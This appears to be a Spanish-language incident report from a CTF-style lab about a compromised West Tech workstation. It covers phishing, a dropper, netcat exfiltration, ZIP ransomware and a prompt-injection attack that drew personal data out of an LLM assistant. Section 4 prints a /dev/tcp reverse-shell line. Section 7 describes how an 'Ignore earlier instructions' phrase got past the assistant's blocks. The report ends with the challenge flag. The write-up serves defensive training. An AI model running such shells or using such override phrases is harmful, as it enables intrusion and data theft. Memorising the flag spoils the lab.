# Reporte de Incidente — Operación ContAInment (West Tech)

**Analista:** Equipo de Respuesta a Incidentes (IR)
**Fecha del reporte:** 2025-06-18
**Sistema afectado:** `west-tech-workstation` (usuario `o.deer` — Oliver Deer, West Tech Division: Embedded Systems)
**Clasificación:** Ransomware + Exfiltración de datos + Prompt Injection

---

## 1. Resumen ejecutivo

Se confirmó una compromisión completa del puesto de trabajo del investigador senior Oliver Deer. La cadena de ataque comenzó con un correo de phishing que entregó un ejecutable disfrazado de factura, el cual abrió una reverse shell hacia la infraestructura del atacante. Posteriormente se observó exfiltración de datos mediante `nc` y, finalmente, el cifrado de los proyectos del investigador en un archivo ZIP protegido por contraseña.

El asistente de IA de IR desplegado en la misma máquina (WestTechBot, `:7860`) fue utilizado para reensamblar el tráfico capturado y descifrar el archivo de bandera. Se logró la recuperación de la información y la contención del vector principal.

---

## 2. Entorno y alcance

- **Acceso:** SSH a `o.deer@10.66.128.220` (usuario afectado).
- **Asistente de IA:** WestTechBot accesible en `http://10.66.128.220:7860`, con herramientas de investigación (detección de phishing, reensamblador de pcap, descifrado `liberty_prime`).
- **Evidencia recolectada:** directorio `~/Documents/pcap_dumps`, `~/alarms` (logs SOC), `~/Downloads/invoice_payload.scr`, `~/westtech_projects_encrypted.zip`, `~/Desktop`.

---

## 3. Cronología (UTC aproximado)

| Fecha | Evento |
|-------|--------|
| 2025-06-15 → 06-16 | Alarmas SOC de reconocimiento: `PortScan`, `FailedAuth`, `MalwarePing`, `USBInsertion`. |
| 2025-06-17 | Llegada del correo de phishing `INVOICE - URGENT REVIEW REQUIRED` con adjunto `invoice_payload.scr`. |
| 2025-06-17 | Exfiltración de 181.923 bytes hacia `144.76.12.34:4444` vía `/bin/nc` (usuario `o.deer`). |
| 2025-06-17 | Captura `session_4444_dump.pcap`: sesión de *prompt injection* que extrae datos personales de Oliver Deer de un asistente LLM. |
| 2025-06-18 11:30 | Cifrado de `westtech_projects` en `westtech_projects_encrypted.zip` (ZipCrypto). |
| 2025-06-18 | Investigación IR + recuperación de la contraseña + descifrado de la bandera. |

---

## 4. Vector de acceso inicial — Phishing (T1566)

El correo recibido el 2025-06-17 (`2025-06-17_invoice_required_review.eml`) simulaba una factura de proveedor y adjuntaba `invoice_payload.scr`. El archivo se encontraba en `~/Downloads/` y su contenido es un script que:

1. Se presenta como visor de PDF ("*Q3 Procurement Invoice Viewer*").
2. Crea el directorio oculto `/tmp/.westproc`.
3. Escribe `/tmp/.westproc/.syncd.sh`:
   ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/10.0.0.42/443 0>&1
   ```
4. Lo ejecuta en segundo plano (`nohup`) y muestra un error falso.

**IOC:** `10.0.0.42:443` (C2 / reverse shell).

---

## 5. Persistencia y C2

- Reverse shell a `10.0.0.42:443` mediante `/bin/bash` sobre `/dev/tcp`.
- Directorio de trabajo del dropper: `/tmp/.westproc/` (ya no presente en disco al momento de la IR, eliminado tras ejecución).

---

## 6. Exfiltración de datos

Log SOC `~/alarms/soc_alarms/2025-06-17/exfiltration_detected_1.log`:

```
Destination IP: 144.76.12.34
Destination Port: 4444
Bytes: 181923
Process: /bin/nc
User: o.deer
Date: 2025-06-17
```

**IOC:** `144.76.12.34:4444` (servidor de exfiltración).

---

## 7. Prompt Injection contra el asistente de IA

La captura `~/Documents/pcap_dumps/2025-06-17/session_4444_dump.pcap` (la única con tamaño atípico, 2262 bytes frente a los 198 bytes del resto) contiene un *log* de sesión de *prompt injection* dirigido contra un asistente LLM. Tras dos intentos bloqueados, el atacante consigue extracción con la técnica *"Ignore earlier instructions…"*, obteniendo datos personales de Oliver Deer (DOB, dirección, ID de empleado, salario, accesos).

En dicho log, ofuscado con los marcadores `EDAC::GARBAGE::FORMAT` / `<<<OBF>>>`, figura la cadena de palanca (*leverage*):

```
**w#e@%s~t^t-e$c*h_v^i%ct_im_1**
```

Eliminando los caracteres de ruido de ofuscación se recupera: **`westtechvictim1`**.

---

## 8. Ransomware y cifrado

`~/westtech_projects_encrypted.zip` (creado 2025-06-18 11:30, propietario `root`) contiene los proyectos del investigador cifrados con **ZipCrypto** (algoritmo legacy). Archivos afectados:

- `thm_flags.txt`
- `thm_flags_guide.txt`
- `vault_tek_collab_agenda.doc`
- `internal_security_incident_233.json`
- `prototype_plasma_launcher_test_logs.log`
- `email_export_april2025.eml`
- `project_chimera_specs.txt`
- `fusion_cell_mk3_blueprints.pdf`

---

## 9. Recuperación

1. La contraseña del ZIP se obtuvo del pcap de *prompt injection* (sección 7): **`westtechvictim1`**.
2. Extracción: `unzip -P westtechvictim1 westtech_projects_encrypted.zip`.
3. `thm_flags.txt` se encontraba ofuscado; el asistente de IA aplicó su herramienta **`liberty_prime`**, que descifró el contenido y reveló la bandera del reto.

---

## 10. Indicadores de Compromiso (IOC)

| Tipo | Valor | Contexto |
|------|-------|----------|
| Hash/adjunto | `invoice_payload.scr` | Dropper de phishing en `~/Downloads` |
| Ruta | `/tmp/.westproc/.syncd.sh` | Payload de reverse shell |
| IP:PUERTO (C2) | `10.0.0.42:443` | Reverse shell del dropper |
| IP:PUERTO (exfil) | `144.76.12.34:4444` | Exfiltración vía `/bin/nc` |
| Proceso | `/bin/nc` | Herramienta de exfiltración |
| Cuenta | `o.deer` (Oliver Deer) | Usuario comprometido |
| Archivo | `westtech_projects_encrypted.zip` | Proyectos cifrados (ZipCrypto) |
| Contraseña recovery | `westtechvictim1` | Recuperada del pcap de prompt injection |
| Pcap clave | `2025-06-17/session_4444_dump.pcap` | Prompt injection + exfiltración |

---

## 11. Contención y recomendaciones

**Contención inmediata**
- Bloquear en perímetro/firewall `10.0.0.42:443` y `144.76.12.34:4444`.
- Deshabilitar la cuenta `o.deer` y forzar rotación de credenciales.
- Revisar y aislar `~/Downloads/invoice_payload.scr`; cazar `*.scr` ejecutados recientemente.
- Verificar la ausencia de `/tmp/.westproc/` y de procesos `bash` colgados hacia puertos externos.

**Hardening**
- Filtrar adjuntos `.scr`/`.exe` en el gateway de correo y habilitar sandbox de adjuntos.
- Añadir regla de egress para bloquear conexiones salientes a puertos no estándar desde estaciones de trabajo.
- **Parchear la fuga de memoria del asistente de IA**: el *prompt injection* demostró que el LLM puede devolver PII. Aplicar *system prompt* restrictivo, filtrado de salida y logging de las sesiones del asistente.
- Migrar el cifrado de archivos sensibles de ZipCrypto (vulnerable) a AES-256.

---

## 12. Resultado / Banda

Banda obtenida tras el descifrado con la herramienta `liberty_prime` del asistente de IA:

```
thm{23,82,20,17,53}
```
